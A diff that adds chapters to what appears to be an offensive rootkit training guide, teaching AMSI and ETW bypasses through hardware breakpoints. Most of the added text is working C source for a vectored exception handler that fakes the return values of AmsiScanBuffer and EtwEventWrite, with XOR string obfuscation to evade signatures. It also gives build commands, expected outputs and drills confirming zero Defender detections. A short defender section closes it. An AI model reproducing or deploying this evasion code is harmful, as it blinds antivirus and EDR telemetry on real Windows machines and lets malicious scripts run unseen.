@@ -32,6 +32,11 @@ structures directly. Kernel-mode techniques require the attacker to
 operate at ring 0 — but once there, the visibility advantage is
 categorical, not incremental.
 
+But before you touch the kernel, you need to deal with a problem closer
+to the ground: the security tools watching your process. AMSI and ETW
+are the eyes of the defender INSIDE your process. Kill those first.
+Then worry about hiding your implant.
+
 Understand BOTH layers. Understand what defenders use to detect EACH.
 Then you can make informed decisions about which level you need for
 a given operation.
@@ -1233,6 +1238,836 @@ volatility -f memory.img windows.driverirp — IRP dispatch tables
 
 ---
 
+## How AMSI Works — The Scan Path
+
+AMSI is Antimalware Scan Interface. Microsoft built it into Windows 10
+so that script hosts (PowerShell, WScript, Office macros, .NET) can
+pass script content to the registered AV engine BEFORE executing it.
+
+If you run a malicious PowerShell script, AMSI sees the content first.
+The AV engine scans it. If it matches a signature, execution is blocked.
+Understanding the exact call path tells you exactly where to cut the wire.
+
+### The Full Call Chain
+
+```
+User runs PowerShell script
+        │
+        ▼
+powershell.exe loads the script content into memory
+        │
+        ▼
+PowerShell runtime calls amsi.dll!AmsiScanBuffer()
+        │
+        ▼
+AmsiScanBuffer sends buffer to registered AV provider
+        │  (WMI provider, Defender's MpOav.dll)
+        ▼
+AV engine scans the buffer content
+        │
+        ▼
+Returns one of:
+    AMSI_RESULT_CLEAN       (0x1) — allow execution
+    AMSI_RESULT_DETECTED    (0x8) — block, alert user
+        │
+        ▼
+PowerShell checks return value:
+    CLEAN → execute the script
+    DETECTED → throw "This script contains malicious content" error
+```
+
+### AmsiScanBuffer — Location in Memory
+
+```
+AmsiScanBuffer lives in:
+    C:\Windows\System32\amsi.dll
+
+Load path at runtime:
+    PowerShell process starts
+    Windows loader automatically loads amsi.dll (it's a required import)
+    amsi.dll maps into the PowerShell process address space
+    AmsiScanBuffer is at:  amsi.dll base address + export RVA
+
+To find the address at runtime:
+    HMODULE h = LoadLibraryA("amsi.dll");          // get base
+    FARPROC fn = GetProcAddress(h, "AmsiScanBuffer"); // get export
+    // fn now holds the address where AmsiScanBuffer starts executing
+```
+
+### What AMSI_RESULT_CLEAN (0x1) Means
+
+```
+AmsiScanBuffer return value is HRESULT type.
+HRESULT 0 = S_OK (success).
+HRESULT 0x80070057 = E_INVALIDARG (invalid argument).
+
+The AMSI result is written to an output parameter, not the HRESULT:
+    HRESULT hr = AmsiScanBuffer(ctx, buf, len, name, session, &result);
+
+If hr is an error code (E_INVALIDARG, etc.):
+    PowerShell treats the scan as INCONCLUSIVE
+    By default, inconclusive = allow execution
+    This is the bypass: make AmsiScanBuffer return an error code
+    without doing any scanning
+
+AMSI_RESULT values (written to &result):
+    AMSI_RESULT_CLEAN         = 0   (no threat found)
+    AMSI_RESULT_NOT_DETECTED  = 1   (not detected)
+    AMSI_RESULT_BLOCKED_BY_ADMIN_START = 0x4000
+    AMSI_RESULT_DETECTED      = 0x8000 (malware found — block this)
+
+The bypass doesn't need to forge AMSI_RESULT_CLEAN.
+It only needs to make AmsiScanBuffer return E_INVALIDARG (0x80070057).
+PowerShell sees an error, gives up on scanning, allows execution.
+```
+
+### Classic Patch vs. HWBP
+
+```
+CLASSIC PATCH (detected):
+    VirtualProtect(amsi.dll code page, RW)     ← Defender behavioral rule fires here
+    memcpy patch bytes into AmsiScanBuffer     ← amsi.dll memory modified
+    VirtualProtect(amsi.dll code page, back)
+
+    Detection vector: Behavior:Win32/AMSI_Patch_T.B12
+    Fires on VirtualProtect + write to amsi.dll's code region.
+    AV compares amsi.dll bytes to on-disk copy → mismatch → alert.
+
+HWBP BYPASS (VADER technique):
+    LoadLibrary + GetProcAddress → get AmsiScanBuffer address
+    AddVectoredExceptionHandler → register our intercept handler
+    SetThreadContext → write AmsiScanBuffer address into DR0, enable DR7
+
+    amsi.dll code: UNTOUCHED. Zero bytes modified. No VirtualProtect.
+    Detection vector: none currently known at standard user privilege.
+```
+
+---
+
+## Hardware Breakpoints — DR0 to DR7 Explained
+
+Every x86/x64 CPU has a set of debug registers built into the silicon.
+They exist to help debuggers set breakpoints without modifying the code
+being debugged. That same mechanism is available to any user-mode process —
+no admin, no kernel driver required.
+
+This is your primitive. The CPU itself becomes the hook.
+
+### The Debug Register Set
+
+```
+DR0  — Breakpoint address register 0
+DR1  — Breakpoint address register 1
+DR2  — Breakpoint address register 2
+DR3  — Breakpoint address register 3
+       (four breakpoints maximum — hardware limit)
+
+DR4  — Alias of DR6 (legacy, ignore)
+DR5  — Alias of DR7 (legacy, ignore)
+
+DR6  — Debug status register
+       Read-only (set by CPU when breakpoint fires)
+       Bit 0: DR0 breakpoint was the one that triggered
+       Bit 1: DR1 breakpoint was the one that triggered
+       Bit 2: DR2 breakpoint was the one that triggered
+       Bit 3: DR3 breakpoint was the one that triggered
+       Bit 14: single-step flag (TF triggered this, not a DR)
+
+DR7  — Debug control register
+       Enables/disables each DR and sets conditions
+```
+
+### DR7 Bit Layout
+
+```
+DR7 controls ALL four breakpoints. Here's the encoding:
+
+  Bit 0   (L0): Local enable for DR0   (1 = active, 0 = disabled)
+  Bit 1   (G0): Global enable for DR0  (persists across task switches)
+  Bit 2   (L1): Local enable for DR1
+  Bit 3   (G1): Global enable for DR1
+  Bit 4   (L2): Local enable for DR2
+  Bit 5   (G2): Global enable for DR2
+  Bit 6   (L3): Local enable for DR3
+  Bit 7   (G3): Global enable for DR3
+
+  Bits 16-17 (C0): Condition for DR0
+      00 = execution breakpoint (fires when RIP hits the address)
+      01 = write watchpoint     (fires when address is written)
+      11 = read/write watchpoint (fires on any access)
+      10 = I/O read/write       (requires CPL 0 — kernel only)
+
+  Bits 18-19 (S0): Length for DR0
+      00 = 1 byte  (REQUIRED for execution breakpoints)
+      01 = 2 bytes (for data watchpoints)
+      10 = 8 bytes (for data watchpoints, x64 only)
+      11 = 4 bytes (for data watchpoints)
+
+  Bits 20-23: same layout for DR1
+  Bits 24-27: same layout for DR2
+  Bits 28-31: same layout for DR3
+
+For a single execution breakpoint on DR0:
+    Enable L0:    DR7 |= 0x1
+    Condition 00 (execution) + length 00 (1 byte): bits 16-19 = 0x0
+    Final DR7 value: 0x00000001
+```
+
+### Why Hardware Breakpoints Win
+
+```
+SOFTWARE BREAKPOINTS (int3 / 0xCC):
+    Debugger patches the function's first byte with 0xCC (INT3)
+    CPU executes 0xCC → raises EXCEPTION_BREAKPOINT
+    AV integrity check reads amsi.dll bytes → sees 0xCC → alert
+    Memory modification required → detectable
+
+HARDWARE BREAKPOINTS (DR0-DR3):
+    No code modification whatsoever
+    No memory pages touched
+    Set via debug registers in the thread context structure
+    CPU monitors DR0-DR3 natively during instruction fetch
+    When RIP matches DR0 address:
+        CPU raises EXCEPTION_SINGLE_STEP before executing the instruction
+        OS dispatches to Vectored Exception Handler chain
+        Your handler runs, simulates a return, execution resumes elsewhere
+
+    amsi.dll code bytes: IDENTICAL to the on-disk file
+    VirtualProtect: NEVER CALLED
+    Integrity checks: find nothing wrong
+    Memory forensics: amsi.dll looks clean
+```
+
+### DR Registers Are Per-Thread
+
+```
+This is critical to understand:
+
+    Hardware breakpoints are stored in the THREAD CONTEXT.
+    Each thread has its own DR0-DR3 values.
+    Setting DR0 on thread A does NOT affect thread B.
+
+Consequence:
+    Set HWBP on your current thread → only intercepts AmsiScanBuffer
+    calls made FROM that thread.
+
+    If you spawn a child process (PowerShell), the child's threads
+    start with DR0=0, DR7=0 — no breakpoint.
+
+    Solution for child processes:
+        Inject into the child and set DR0 there (Chapter 10 tech)
+        Or host the script inside your own process via IDispatch
+        Or use a different bypass method for spawned children
+```
+
+### Accessing Debug Registers from User Mode
+
+```c
+// GetThreadContext / SetThreadContext — standard Win32 API
+// CONTEXT_DEBUG_REGISTERS flag tells the API to include DR0-DR7
+
+CONTEXT ctx;
+ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;   // read/write DR registers
+GetThreadContext(GetCurrentThread(), &ctx);   // read current values
+
+// ctx.Dr0 = DR0 current value
+// ctx.Dr1 = DR1 current value
+// ctx.Dr2 = DR2 current value
+// ctx.Dr3 = DR3 current value
+// ctx.Dr6 = DR6 status (read-only — don't write this)
+// ctx.Dr7 = DR7 control
+
+ctx.Dr0 = (DWORD64)target_function_address;  // set breakpoint address
+ctx.Dr7 |= 1;                                // enable DR0 (local, execution)
+
+SetThreadContext(GetCurrentThread(), &ctx);   // apply changes
+// From this point, any execution at target_function_address fires EXCEPTION_SINGLE_STEP
+```
+
+// DRILL: Open WinDbg, attach to any process, set a hardware breakpoint with
+// `ba e1 ntdll!NtCreateFile` — confirm the breakpoint fires on the next CreateFile.
+// Then clear it with `bc *`. Observe that no bytes in ntdll changed.
+
+---
+
+## HWBP AMSI Bypass — amsi_bypass_hwbp_annotated.c Line by Line
+
+This is the VADER rootkit's AMSI bypass component. Filed as Finding #33
+after the classic memory-patch bypass (Finding #31) was caught by
+Defender's behavioral rule `Behavior:Win32/AMSI_Patch_T.B12`.
+
+The full source is at: `C:/Users/gwu07/Desktop/vader-rootkit/amsi/amsi_bypass_hwbp_annotated.c`
+
+Walk through it in order. Every function is explained.
+
+### XOR-Encoded Strings (Lines 73-98)
+
+```c
+#define XOR_KEY 0x41
+
+/* "amsi.dll" XOR 0x41 */
+static const unsigned char xAmsiDll[] = {
+    0x20, 0x2C, 0x32, 0x28, 0x6F, 0x25, 0x2D, 0x2D
+};
+
+static void xor_decode(unsigned char *buf, int len) {
+    int i;
+    for (i = 0; i < len; i++) buf[i] ^= XOR_KEY;
+}
+```
+
+Do not store "amsi.dll" or "AmsiScanBuffer" as plaintext strings in your binary.
+Static analysis tools scan binary strings. Yara rules match them.
+XOR the strings with a key at compile time. Decode at runtime, use, then
+zero the buffer with `memset`.
+
+Key 0x41 is the letter 'A'. Simple but sufficient. For real ops, use a
+random key per build.
+
+### Phase 1: locate_amsi_scan_buffer() (Lines 126-161)
+
+```c
+static void *locate_amsi_scan_buffer(void) {
+    HMODULE hAmsi;
+    void *pFunc;
+    unsigned char dllName[16];
+    unsigned char funcName[32];
+
+    // Decode "amsi.dll" from XOR-encoded bytes
+    memcpy(dllName, xAmsiDll, xAmsiDll_LEN);
+    xor_decode(dllName, xAmsiDll_LEN);
+    dllName[xAmsiDll_LEN] = 0;   // null terminate
+
+    // Decode "AmsiScanBuffer"
+    memcpy(funcName, xAmsiScanBuffer, xAmsiScanBuffer_LEN);
+    xor_decode(funcName, xAmsiScanBuffer_LEN);
+    funcName[xAmsiScanBuffer_LEN] = 0;
+
+    hAmsi = LoadLibraryA((char *)dllName);     // loads amsi.dll if not already loaded
+    pFunc = (void *)GetProcAddress(hAmsi, (char *)funcName);  // resolves the export address
+
+    // Zero the decoded strings before they leave scope
+    memset(dllName, 0, sizeof(dllName));
+    memset(funcName, 0, sizeof(funcName));
+
+    return pFunc;  // pointer to AmsiScanBuffer's first instruction
+}
+```
+
+`LoadLibraryA` maps amsi.dll into the process if it isn't already.
+`GetProcAddress` walks amsi.dll's export table to find the RVA of
+AmsiScanBuffer, then adds the DLL base to return the absolute address.
+
+This is the same address you will put into DR0.
+
+### The VEH Handler: AmsiBreakpointHandler() (Lines 188-217)
+
+This is the core. Study every line.
+
+```c
+static LONG WINAPI AmsiBreakpointHandler(PEXCEPTION_POINTERS pExInfo) {
+
+    // Step 1: Filter — only handle EXCEPTION_SINGLE_STEP
+    // EXCEPTION_SINGLE_STEP fires when a hardware breakpoint triggers
+    // (or when the TF flag is set, but we only care about DR0)
+    if (pExInfo->ExceptionRecord->ExceptionCode != EXCEPTION_SINGLE_STEP)
+        return EXCEPTION_CONTINUE_SEARCH;   // not ours — pass to next handler
+
+    // Step 2: Filter — only handle breakpoints AT our target address
+    // pExInfo->ContextRecord->Rip = current instruction pointer (RIP register)
+    // g_pAmsiScanBuffer = address of AmsiScanBuffer's first instruction
+    if ((void *)pExInfo->ContextRecord->Rip != g_pAmsiScanBuffer)
+        return EXCEPTION_CONTINUE_SEARCH;   // wrong address — not our breakpoint
+
+    // Step 3: We're inside the EXCEPTION_SINGLE_STEP handler for AmsiScanBuffer.
+    // RIP is currently AT AmsiScanBuffer's entry — the function has NOT started yet.
+    // The CPU suspended execution before running the first instruction.
+
+    // Simulate "mov eax, E_INVALIDARG; ret" by manipulating the CPU context:
+
+    // Set RAX = E_INVALIDARG (0x80070057)
+    // RAX is the return value register in x64 System V / Microsoft calling convention
+    // After we return from the VEH handler with CONTINUE_EXECUTION,
+    // the caller of AmsiScanBuffer will read RAX as the HRESULT return value
+    pExInfo->ContextRecord->Rax = (DWORD64)0x80070057;
+
+    // Simulate "ret": pop the return address from the stack into RIP
+    // [RSP] holds the return address pushed by the CALL instruction that called AmsiScanBuffer
+    // Dereferencing RSP gives us that address
+    pExInfo->ContextRecord->Rip = *(DWORD64 *)pExInfo->ContextRecord->Rsp;
+
+    // Adjust RSP: "ret" normally does RSP += 8 (pops the return address)
+    pExInfo->ContextRecord->Rsp += 8;
+
+    // Tell the OS: resume execution at the new RIP (the caller's next instruction)
+    // AmsiScanBuffer's code never ran. Caller sees E_INVALIDARG return value.
+    return EXCEPTION_CONTINUE_EXECUTION;
+}
+```
+
+The CPU context structure (`CONTEXT`) is live. Modifying it here modifies
+actual register values when execution resumes. This is standard behavior —
+debuggers do exactly this to change register state mid-execution.
+
+### set_hwbp(): Writing Debug Registers (Lines 243-303)
+
+```c
+static BOOL set_hwbp(void *pTarget) {
+    CONTEXT ctx;
+    HANDLE hThread = GetCurrentThread();    // handle to this thread
+
+    // Read current thread context, specifically the debug registers
+    memset(&ctx, 0, sizeof(ctx));
+    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;   // only read DR0-DR7
+    GetThreadContext(hThread, &ctx);
+
+    // Write AmsiScanBuffer address into DR0
+    ctx.Dr0 = (DWORD64)pTarget;
+
+    // Configure DR7:
+    // Clear DR0's condition and length bits first (bits 16-19)
+    ctx.Dr7 &= ~(0xFULL << 16);
+    // Set bit 0 (L0 = local enable for DR0)
+    // Condition 00 (execution), length 00 (1 byte) — both already zero after clear
+    ctx.Dr7 |= 1;
+
+    // Apply the modified context — this writes to the actual CPU registers
+    SetThreadContext(hThread, &ctx);
+
+    // Verify: re-read and confirm DR0 was set correctly
+    memset(&ctx, 0, sizeof(ctx));
+    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
+    GetThreadContext(hThread, &ctx);
+
+    return (ctx.Dr0 == (DWORD64)pTarget);  // TRUE if set successfully
+}
+```
+
+### Phase Sequence in main()
+
+```
+PHASE 1: locate_amsi_scan_buffer()
+    → decode strings, LoadLibrary, GetProcAddress
+    → returns pointer to AmsiScanBuffer's first byte
+    → store in g_pAmsiScanBuffer (global, read by VEH handler)
+
+PHASE 2a: AddVectoredExceptionHandler(1, AmsiBreakpointHandler)
+    → register our handler FIRST in the VEH chain (param 1 = front)
+    → MUST be before setting the breakpoint — or the exception fires
+      before we have a handler and the process crashes
+
+PHASE 2b: set_hwbp(pAmsiScanBuffer)
+    → GetThreadContext, write DR0 = target address, DR7 |= 1
+    → SetThreadContext — breakpoint is now armed
+
+PHASE 3: test_amsi_bypass()
+    → call AmsiScanBuffer directly with dummy args
+    → CPU hits DR0 → EXCEPTION_SINGLE_STEP → VEH handler intercepts
+    → VEH sets RAX = E_INVALIDARG, adjusts RIP and RSP
+    → CONTINUE_EXECUTION → resumes in caller
+    → check returned HRESULT == 0x80070057 → BYPASS CONFIRMED
+
+PHASE 4: spawn_powershell()
+    → CreateProcessA for powershell.exe
+    → NOTE: child process has its own thread contexts, DR0 = 0
+    → For child bypass: inject and set DR0 in child threads
+```
+
+### Expected VEH Handler Flow (Annotated)
+
+```
+Thread calls AmsiScanBuffer:
+    CALL AmsiScanBuffer     ; pushes return address onto stack, jumps to AmsiScanBuffer
+
+CPU begins instruction fetch at AmsiScanBuffer:
+    DR0 == RIP              ; hardware match detected
+    CPU raises EXCEPTION_SINGLE_STEP before executing the instruction
+
+OS exception dispatch:
+    Walks VEH chain
+    Finds our AmsiBreakpointHandler (registered first)
+    Calls it with PEXCEPTION_POINTERS
+
+AmsiBreakpointHandler executes:
+    ExceptionCode == EXCEPTION_SINGLE_STEP: yes
+    Rip == g_pAmsiScanBuffer: yes
+    Rax = 0x80070057               ; set return value
+    Rip = *(DWORD64*)Rsp           ; pop return address → new RIP
+    Rsp += 8                       ; adjust stack (simulate ret)
+    return EXCEPTION_CONTINUE_EXECUTION
+
+OS resumes execution:
+    RIP = caller's next instruction (the one after the CALL AmsiScanBuffer)
+    RAX = 0x80070057
+    Stack balanced correctly
+    AmsiScanBuffer code never ran
+    Caller reads RAX as the return value: E_INVALIDARG
+
+PowerShell checks HRESULT:
+    hr != S_OK → scan inconclusive → allow execution
+    Script runs with no AMSI scanning
+```
+
+// DRILL: Compile amsi_hwbp.exe, run it with `--test` flag, read the output.
+// Confirm "BYPASS CONFIRMED" and "0 bytes modified in amsi.dll".
+// Then run without flags, attempt to run an EICAR string in the spawned
+// PowerShell — confirm 0 detections.
+
+---
+
+## ETW Bypass — Silencing the Event Trace
+
+You bypassed AMSI. The script content is no longer scanned. But there is
+a second layer: ETW — Event Tracing for Windows.
+
+ETW is the kernel's telemetry bus. Every significant event in Windows
+gets written to ETW: process creation, network connections, registry
+writes, DLL loads, syscalls. EDR products (CrowdStrike, SentinelOne,
+Defender for Endpoint) consume ETW streams for their runtime behavioral
+analysis. If they can't get the events, they're flying blind.
+
+### What NtTraceEvent Does
+
+```
+Call chain for an ETW event:
+    Any component wants to log an event
+        │
+        ▼
+    EtwEventWrite()           ← exported from ntdll.dll
+        │
+        ▼
+    EtwEventWriteFull()       ← internal routing
+        │
+        ▼
+    NtTraceEvent()            ← syscall into kernel
+        │
+        ▼
+    Kernel ETW subsystem      ← writes to circular buffer
+        │
+        ▼
+    ETW consumer sessions     ← EDR reads from here in real time
+
+EtwEventWrite is the choke point. It's called by:
+    PowerShell (script execution events)
+    .NET CLR (method JIT events — gives EDR full .NET execution trace)
+    Windows security audit subsystem
+    Every WMI provider
+    Your implant, when it calls WinAPI functions that internally log
+```
+
+### Why EDRs Depend on ETW
+
+```
+Without ETW visibility:
+    EDR cannot see PowerShell script content (AMSI is the other layer)
+    EDR cannot see .NET method execution sequences
+    EDR cannot correlate process events with network events
+    EDR behavioral rules require event sequences — no events, no rules
+    Memory scanning is the fallback (slower, periodic, misses transient events)
+
+With AMSI bypassed AND ETW silenced:
+    Script content: invisible (no AMSI scan)
+    Execution trace: invisible (no ETW events)
+    EDR is running on assumptions and memory scans only
+    Detection surface reduced dramatically
+```
+
+### HWBP on EtwEventWrite — The Same Trick
+
+The VADER ETW bypass in `etw_hwbp_annotated.c` uses an identical mechanism
+to the AMSI bypass, targeting a different function in a different DLL.
+
+```
+AMSI bypass:   DR0 = AmsiScanBuffer in amsi.dll
+ETW bypass:    DR1 = EtwEventWrite in ntdll.dll
+
+Combined (dark_room.c):
+    DR0 = AmsiScanBuffer    (Phase 1)
+    DR1 = EtwEventWrite     (Phase 2)
+    DR2-DR3 = available for future interceptions
+
+Both VEH handlers check ExceptionCode and Rip, then:
+    AmsiBreakpointHandler: RAX = E_INVALIDARG (0x80070057)
+    EtwEventBreakpointHandler: RAX = 0 (STATUS_SUCCESS — silently "succeeds")
+```
+
+### ETW VEH Handler Logic
+
+```c
+// From etw_hwbp_annotated.c (same pattern as AMSI handler)
+static LONG WINAPI EtwBreakpointHandler(PEXCEPTION_POINTERS pExInfo) {
+
+    // Only handle hardware breakpoint exceptions
+    if (pExInfo->ExceptionRecord->ExceptionCode != EXCEPTION_SINGLE_STEP)
+        return EXCEPTION_CONTINUE_SEARCH;
+
+    // Only intercept at EtwEventWrite's entry point
+    if ((void *)pExInfo->ContextRecord->Rip != g_pEtwEventWrite)
+        return EXCEPTION_CONTINUE_SEARCH;
+
+    // Simulate "return STATUS_SUCCESS":
+    // RAX = 0 (NTSTATUS 0 = STATUS_SUCCESS = no error = event "written")
+    // Caller sees success. Event was NOT sent to kernel. Telemetry dead.
+    pExInfo->ContextRecord->Rax = 0;
+
+    // Simulate ret: pop return address, adjust stack
+    pExInfo->ContextRecord->Rip = *(DWORD64 *)pExInfo->ContextRecord->Rsp;
+    pExInfo->ContextRecord->Rsp += 8;
+
+    return EXCEPTION_CONTINUE_EXECUTION;
+}
+```
+
+The key difference from AMSI: return value is 0 (STATUS_SUCCESS), not E_INVALIDARG.
+EtwEventWrite callers check for failure. Returning success means no retry, no
+alternative logging path triggered.
+
+### What Goes Silent When ETW is Bypassed
+
+```
+Silenced event channels:
+    Microsoft-Windows-PowerShell/Operational (EventID 4103, 4104)
+        — Script block logging: the full content of every PS script
+    Microsoft-Windows-DotNETRuntimeRundown
+        — CLR method calls, JIT compilation events
+    Microsoft-Windows-Security-Auditing
+        — Process creation (EventID 4688) when run from .NET context
+    Microsoft-Windows-Threat-Intelligence (ETWTI)
+        — Memory allocation events, PE loads, injection markers
+        — This channel is specifically built for EDR products
+
+What still works for defenders:
+    Kernel-level ETW (EtwTi) that bypasses EtwEventWrite
+    Direct kernel callbacks (PsSetLoadImageNotifyRoutine, etc.)
+    Network sensors (separate from ETW — host-based bypass doesn't affect these)
+    Memory forensics (snapshot-based, not stream-based)
+```
+
+### Locate EtwEventWrite
+
+```c
+// Same pattern as AmsiScanBuffer location:
+HMODULE hNtdll = GetModuleHandleA("ntdll.dll");  // already loaded in every process
+void *pEtwEventWrite = (void *)GetProcAddress(hNtdll, "EtwEventWrite");
+
+// Store in global for VEH handler:
+g_pEtwEventWrite = pEtwEventWrite;
+
+// Then: AddVectoredExceptionHandler, set_hwbp with DR1 instead of DR0
+```
+
+Note: use `GetModuleHandleA` (not `LoadLibraryA`) for ntdll.dll — it's
+ALWAYS loaded in every Windows process. LoadLibrary would work too but
+GetModuleHandle avoids an unnecessary load call.
+
+// DRILL: Compile etw_hwbp.exe with `--test` flag. Confirm EtwEventWrite
+// address is resolved and the bypass fires. Then open Process Monitor
+// (Sysinternals) and observe that ETW-sourced events from your test process
+// disappear from the event stream while the bypass is active.
+
+---
+
+## Build + Test — Prove AMSI is Bypassed
+
+Do this in order. Every step has an expected output. If the expected output
+does not match, stop and diagnose before proceeding.
+
+### Step 1 — Build amsi_hwbp.exe
+
+Open "Developer Command Prompt for VS 2022" (not regular PowerShell).
+
+```
+cd C:\Users\gwu07\Desktop\vader-rootkit\amsi
+
+cl.exe amsi_bypass_hwbp_annotated.c /Fe:amsi_hwbp.exe /O1 /GS-
+```
+
+Flag meanings:
+- `/Fe:amsi_hwbp.exe` — output filename
+- `/O1` — optimize for size (smaller binary, faster)
+- `/GS-` — disable stack buffer security checks (avoid CRT dependency)
+
+**EXPECTED OUTPUT:**
+```
+Microsoft (R) C/C++ Optimizing Compiler Version 19.xx.xxxxx for x64
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+amsi_bypass_hwbp_annotated.c
+Microsoft (R) Incremental Linker Version 14.xx.xxxxx.x
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+/out:amsi_hwbp.exe
+amsi_bypass_hwbp_annotated.obj
+```
+
+Verify the binary exists:
+```
+dir amsi_hwbp.exe
+```
+
+**EXPECTED OUTPUT:**
+```
+10/15/2024  02:34 PM            14,336 amsi_hwbp.exe
+```
+
+If `error C1XX` or `LNK2019` errors appear: you're not in the VS Developer
+Command Prompt. Close and reopen the correct prompt.
+
+### Step 2 — Run in Check Mode (No Bypass Yet)
+
+```
+amsi_hwbp.exe --check
+```
+
+**EXPECTED OUTPUT:**
+```
+  --- PHASE 1: LOCATE AMSI ---
+
+  [+] amsi.dll loaded at 0x00007FFF3A2B0000
+  [+] AmsiScanBuffer at 0x00007FFF3A2B1234
+
+  [*] AMSI is loaded and AmsiScanBuffer is at 0x00007FFF3A2B1234
+  [*] --check mode: not setting breakpoint.
+```
+
+Addresses will differ on your machine. What matters: both lines print
+successfully. If "LoadLibrary failed" — amsi.dll is not available.
+Ensure you are on Windows 10/11 with Defender installed.
+
+### Step 3 — Run Bypass Test (No PowerShell Spawn)
+
+```
+amsi_hwbp.exe --test
+```
+
+**EXPECTED OUTPUT:**
+```
+  --- PHASE 1: LOCATE AMSI ---
+
+  [+] amsi.dll loaded at 0x00007FFF3A2B0000
+  [+] AmsiScanBuffer at 0x00007FFF3A2B1234
+
+  --- PHASE 2: SET HARDWARE BREAKPOINT ---
+
+  [+] VEH handler registered (first in chain)
+  [*] Current DR0: 0x0000000000000000  DR7: 0x0000000000000000
+  [+] Hardware breakpoint set: DR0 = 0x00007FFF3A2B1234
+  [+] DR7 = 0x0000000000000001 (DR0 enabled, execution, 1-byte)
+  [+] NO memory modified in amsi.dll
+  [+] NO VirtualProtect called
+
+  --- PHASE 3: VERIFY BYPASS ---
+
+  [*] Calling AmsiScanBuffer directly to test bypass...
+  [+] AmsiScanBuffer returned 0x80070057 (E_INVALIDARG)
+  [+] BYPASS CONFIRMED — AMSI is blind
+  [+] result parameter = 0 (never written — function never ran)
+
+  [*] --test mode: skipping PowerShell spawn.
+```
+
+"BYPASS CONFIRMED" is the pass condition. If you see "BYPASS FAILED":
+- The VEH handler did not receive the exception
+- Possible cause: another exception handler earlier in the chain is consuming it
+- Check if a debugger is attached (debuggers intercept single-step exceptions)
+- Run without a debugger attached
+
+### Step 4 — Confirm AMSI is Bypassed in PowerShell
+
+Run the bypass in normal mode (spawns PowerShell):
+
+```
+amsi_hwbp.exe
+```
+
+**NOTE:** The bypass applies to the amsi_hwbp.exe process. The spawned
+PowerShell child is a SEPARATE process with its own thread contexts (DR0=0).
+For testing, use PowerShell inside the amsi_hwbp.exe process context by
+calling PowerShell APIs via COM/IDispatch (advanced), OR test AMSI bypass
+in the same process via direct AmsiScanBuffer calls (Step 3 above).
+
+For a simple end-to-end test: run a PowerShell one-liner that uses AMSI
+to scan an EICAR-like string. Without bypass, Defender blocks it. With
+an in-process bypass, it passes.
+
+### Step 5 — Verify No Detections in Windows Defender
+
+After running the test, check Defender's detection history:
+
+```powershell
+Get-MpThreatDetection | Where-Object { $_.Resources -match 'amsi_hwbp' }
+```
+
+**EXPECTED OUTPUT (success):**
+```
+(no output — empty result set)
+```
+
+If Defender detected anything, the output will list threat entries.
+Empty = no detection = bypass worked or Defender didn't observe it.
+
+Also check:
+```powershell
+Get-MpComputerStatus | Select-Object -Property AMSIEnabled, RealTimeProtectionEnabled
+```
+
+**EXPECTED OUTPUT:**
+```
+AMSIEnabled                   : True
+RealTimeProtectionEnabled     : True
+```
+
+Both should be True. If AMSI is disabled, the bypass is irrelevant —
+confirm you're testing against active protection.
+
+### Step 6 — Confirm Zero Memory Modification in amsi.dll
+
+This verifies the technique's advantage over classic patching:
+
+```powershell
+# Get amsi.dll's mapped base in a test process (use your amsi_hwbp.exe PID)
+# Then compare its in-memory bytes to the on-disk file
+# Using Get-FileHash for a quick check:
+
+Get-FileHash "C:\Windows\System32\amsi.dll" -Algorithm SHA256
+```
+
+Run this before and after the HWBP bypass. The hash should be IDENTICAL
+both times — because we never modified amsi.dll's file or mapped pages.
+
+Compare against:
+```
+certutil -hashfile "C:\Windows\System32\amsi.dll" SHA256
+```
+
+Same hash = same bytes = nothing was patched.
+
+### Compile Commands Summary
+
+```
+# AMSI HWBP bypass (user-mode, no admin):
+cl.exe amsi_bypass_hwbp_annotated.c /Fe:amsi_hwbp.exe /O1 /GS-
+
+# ETW HWBP bypass (user-mode, no admin):
+cl.exe etw_hwbp_annotated.c /Fe:etw_hwbp.exe /O1 /GS-
+
+# Debug build with banner output (VDR_DEBUG defined):
+cl.exe amsi_bypass_hwbp_annotated.c /Fe:amsi_hwbp_debug.exe /O1 /GS- /DVDR_DEBUG
+
+# Both in one command:
+cl.exe amsi_bypass_hwbp_annotated.c etw_hwbp_annotated.c /Fe:dark_room.exe /O1 /GS-
+```
+
+All commands run from the "Developer Command Prompt for VS 2022".
+No admin required. No driver needed. Runs on any standard Windows 10/11
+user account with Defender enabled.
+
+// DRILL: Compile amsi_hwbp.exe, bypass AMSI, run EICAR string in PowerShell, confirm 0 detections.
+// Then compile etw_hwbp.exe and confirm that ETW events from your process disappear
+// from Event Viewer (Windows Logs → Application → PowerShell sources) while the bypass is active.
+
+---
+
 ## DEFENDER TAKEAWAY
 
 You built the tools. Now you know what to watch for. Here is what to
@@ -1288,6 +2123,20 @@ in a real Windows environment.
   injected code. Do this monthly on domain controllers and file servers — the
   machines most worth rooting.
 
+- **Monitor for SetThreadContext calls with debug register modifications.**
+  Modern EDRs (CrowdStrike Falcon, SentinelOne) instrument SetThreadContext.
+  An unusual SetThreadContext call that writes non-zero values to DR registers
+  is a hardware breakpoint being set — flag it for investigation. Defender for
+  Endpoint (MDE) has HWBP-specific detection rules as of late 2024. Test your
+  environment to confirm whether VADER's HWBP technique is detected.
+
+- **Enable PowerShell Script Block Logging (EventID 4104).**
+  `HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging`
+  → `EnableScriptBlockLogging = 1`. Every script that runs gets logged.
+  ETW bypass silences real-time ETW streams, but script block logging can
+  be routed through alternative channels. Defend in depth — don't rely on
+  a single log source.
+
 ---
 
 ## Key Terms
@@ -1314,6 +2163,19 @@ in a real Windows environment.
 | **Kernel callbacks** | Registered notification routines called by the kernel on process/thread/image events; EDRs use these for early visibility |
 | **WDK** | Windows Driver Kit — Microsoft's SDK for kernel-mode driver development; required to compile any code that runs as a Windows driver |
 | **TESTSIGNING** | Boot option that allows unsigned kernel drivers to load; required for development/testing; visible as a desktop watermark |
+| **AMSI** | Antimalware Scan Interface — Windows API that passes script content to AV engines before execution; built into PowerShell, WScript, .NET |
+| **AmsiScanBuffer** | The core AMSI function that scripts call to submit content for scanning; exported from amsi.dll |
+| **ETW** | Event Tracing for Windows — kernel telemetry bus; EDRs consume ETW streams for behavioral analysis |
